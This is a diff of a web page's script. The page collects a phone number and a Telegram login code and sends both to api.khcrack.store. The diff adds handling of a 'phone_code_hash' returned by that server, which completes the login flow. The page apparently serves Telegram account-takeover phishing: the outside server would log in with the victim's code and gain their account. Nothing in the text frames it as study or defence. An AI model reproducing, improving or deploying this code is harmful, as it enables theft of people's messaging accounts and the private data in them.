@@ -26,50 +26,53 @@
         <div id="message" class="mt-4 text-center text-sm text-gray-600"></div>
     </div>
     <script>
-        async function sendRequest(url, data) {
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                return await response.json();
-            } catch (error) {
-                return { error: 'Network error: ' + error.message };
-            }
+    async function sendRequest(url, data) {
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            return await response.json();
+        } catch (error) {
+            return { error: 'Network error: ' + error.message };
         }
+    }
 
-        document.getElementById('send-otp').addEventListener('click', async () => {
-            const phone = document.getElementById('phone').value;
-            if (!phone.match(/^\+\d{10,15}$/)) {
-                document.getElementById('message').innerText = 'Please enter a valid phone number with country code.';
-                return;
-            }
-            document.getElementById('message').innerText = 'Sending OTP...';
-            const result = await sendRequest('https://api.khcrack.store/send_otp', { phone });
-            if (result.error) {
-                document.getElementById('message').innerText = result.error;
-            } else {
-                document.getElementById('phone-form').classList.add('hidden');
-                document.getElementById('otp-form').classList.remove('hidden');
-                document.getElementById('message').innerText = 'OTP sent! Please check your Telegram app.';
-            }
-        });
+    let phoneCodeHash = null;
 
-        document.getElementById('submit-otp').addEventListener('click', async () => {
-            const phone = document.getElementById('phone').value;
-            const otp = document.getElementById('otp').value;
-            if (!otp.match(/^\d{5}$/)) {
-                document.getElementById('message').innerText = 'Please enter a valid 5-digit OTP.';
-                return;
-            }
-            document.getElementById('message').innerText = 'Verifying OTP...';
-            const result = await sendRequest('https://api.khcrack.store/verify_otp', { phone, otp });
-            document.getElementById('message').innerText = result.message || result.error;
-            if (!result.error) {
-                document.getElementById('otp-form').classList.add('hidden');
-            }
-        });
-    </script>
+    document.getElementById('send-otp').addEventListener('click', async () => {
+        const phone = document.getElementById('phone').value;
+        if (!phone.match(/^\+\d{10,15}$/)) {
+            document.getElementById('message').innerText = 'Please enter a valid phone number with country code.';
+            return;
+        }
+        document.getElementById('message').innerText = 'Sending OTP...';
+        const result = await sendRequest('https://api.khcrack.store/send_otp', { phone });
+        if (result.error) {
+            document.getElementById('message').innerText = result.error;
+        } else {
+            phoneCodeHash = result.phone_code_hash; // Store the hash
+            document.getElementById('phone-form').classList.add('hidden');
+            document.getElementById('otp-form').classList.remove('hidden');
+            document.getElementById('message').innerText = 'OTP sent! Please check your Telegram app.';
+        }
+    });
+
+    document.getElementById('submit-otp').addEventListener('click', async () => {
+        const phone = document.getElementById('phone').value;
+        const otp = document.getElementById('otp').value;
+        if (!otp.match(/^\d{5}$/)) {
+            document.getElementById('message').innerText = 'Please enter a valid 5-digit OTP.';
+            return;
+        }
+        document.getElementById('message').innerText = 'Verifying OTP...';
+        const result = await sendRequest('https://api.khcrack.store/verify_otp', { phone, otp, phone_code_hash: phoneCodeHash });
+        document.getElementById('message').innerText = result.message || result.error;
+        if (!result.error) {
+            document.getElementById('otp-form').classList.add('hidden');
+        }
+    });
+</script>
 </body>
 </html>
